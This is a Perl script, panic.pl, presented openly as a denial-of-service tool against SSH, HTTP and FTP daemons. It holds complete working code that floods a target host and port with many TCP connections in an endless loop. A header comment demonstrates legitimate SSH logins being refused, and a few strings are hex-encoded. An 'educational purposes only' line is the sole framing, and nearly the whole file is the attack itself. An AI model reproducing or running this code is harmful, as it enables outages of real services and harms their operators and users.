   #!/usr/bin/perl
   # panic.pl
   #           Author: nuTshell <carloslack AT gmail DOT com>
   #           another sshd<->httpd<->ftpd and maybe other services DoS tool
   #
   # Demonstration:
   #
   # ------[tty1 begin]------
   # $ ./panic.pl localhost 22 200 60
   # panic.pl written by nuTshell
   # sshd/httpd DoS tool
   #
   # Attempting to connect localhost:22...
   # .............OK!
   #
   # [!] Start to flooding localhost:22
   # [!] Sockets: 200
   # [!] Sleep time between each stage: 60
   # [!] Stages: -31337 [endless_loop]
   #
   # !/\/\/\-> TARGET localhost:22 TARGET <-/\/\/\!
   # attempting do connect 200 sockets, wait...
   # [!] SOCK_0 [----------> SOCK_199
   # [!] Connected 200 of 200 sockets
   # [!] Stages: -31337 [endless_loop]
   # [!] Stage 1 completed, sleeping 60 sec...
   # ------[tty1 end]------
   # ------[tty2 begin]------
   # $ ssh localhost
   # ssh_exchange_identification: Connection closed by remote host
   # $ ssh localhost
   # ssh_exchange_identification: Connection closed by remote host
   # $ ssh localhost
   # ssh_exchange_identification: Connection closed by remote host
   # ------[tt2 end]------
   #
   # WARNING: this code does not spoof your ip,
   #            so be carefull.
   #
   # Software for educational purposes only.
   #
   # Greetz goes to: hexdump, Shorgen, kid gonzalez, Codak, drk, Mathieu,
   #                 ttaranto, setnf, eniac, Acid-Warz, estevao, F-117, lewney
   #                 ryan, posidron, rushjo, thauros, noname, and bla bla bla...
   #
   # Love goes to my girl kk!
   use Socket;
   use IO::Socket;
   use warnings;
   use Term::ANSIColor;
   $SIG{INT} = \&quit;
   my $host = $ARGV[0] || 127.0.0.1;
   my $port = $ARGV[1] || 22;
   my $end1 = $ARGV[2] or &usage and exit(0);
   my $sleeptime = $ARGV[3] or &usage and exit(0);
   my $stageslmt = $ARGV[4] || -31337;
   my $end2 = $end1;
   my $end3 = $end1;
   my $stage = 0;
   my $start1 = 0;
   my $start2 = $start1;
   my $forcesock1;
   my $msgstart = $start1;
   my $msgend = $end1 - 1;
   my $bar = 0;
   my $barloop = 0;
   my $info;
   my $protocol = getprotobyname("\x74\x63\x70");
   my $iaddr = inet_aton($host);
   my $paddr = sockaddr_in($port, $iaddr);

   sub usage() {
   printf <<EOF
   panic.pl written by \x6e\x75\x54\x73\x68\x65\x6c\x6c
   sshd/httpd DoS tool

   Usage: $0 localhost  22      200        120      10
   Description:      |->addr    |->port |->sockets |->delay |->stages [optional]
   EOF
   }
   sub quit() {
       printf("\n\ncaught SIGINT signal\n");
       printf("Aborting attack: $0 $host $port $end1 $sleeptime $stageslmt\n");
       exit(1);
   }
   sub printbar() {
   $bar = $barloop + 1 ; $barloop++;
   if ($bar == 20) {print "-" ; $bar = 0 ; $barloop = 0};
   }
   printf("panic.pl written by \x6e\x75\x54\x73\x68\x65\x6c\x6c\nsshd/httpd DoS tool\n\n");
   printf("Attempting to connect $host:$port...\n");
   my $socktest = IO::Socket::INET->new (PeerAddr=>$host,PeerPort=>$port,Proto=>$protocol,Timeout=>10,ReuseAddr=>1) or die "Connection refused\n";
   shutdown($socktest, 2) || printf("Error closing $socktest\n");
   printf(".............OK!\n\n");
   printf("[!] Start to flooding $host:$port\n");
   printf("[!] Sockets: $end1\n");
   printf("[!] Sleep time between each stage: $sleeptime\n");
   if ($stageslmt == -31337) {$info = "[endless_loop]"} else {$info = "[limited]"}
   printf("[!] Stages: $stageslmt $info\n\n");
   while(31337) {
   printf("!/\\/\\/\\-> TARGET");
   print color("bold")," $host:$port ",color("reset");
   printf("TARGET <-/\\/\\/\\\!\n");
   printf("attempting do connect $end2 sockets, wait...");
   printf("\n[!] SOCK_$msgstart ");
   $start1 = 0;
   printf("[");
   while($start1<$end1) {
   &printbar;
   $forcesock1 = "\x53\x4f\x43\x4b_$start1";
   socket($forcesock1, PF_INET, SOCK_STREAM, $protocol);
   connect($forcesock1, $paddr) || $end3--;
   $start1++;
   }
   printf("> SOCK_$msgend\n");
   printf("[!] Connected $end3 of $end2 sockets\n");
   printf("[!] Stages: $stageslmt $info\n");
   $stage++;
   if($stageslmt == $stage) {printf("[*] Stage $stage completed\nDone!\n") ; exit(0)}
   printf("[!] Stage $stage completed, sleeping $sleeptime sec...\n\n");
   sleep($sleeptime);
   $start2 = 0;
   while($start2<$end2) {
   $forcesock2 = "\x53\x4f\x43\x4b_$start2" ;
   shutdown($forcesock2, 2) or die "$!\n";
   $start2++;
   }}
   #EOF (End of \x46\x55\x43\x4b)
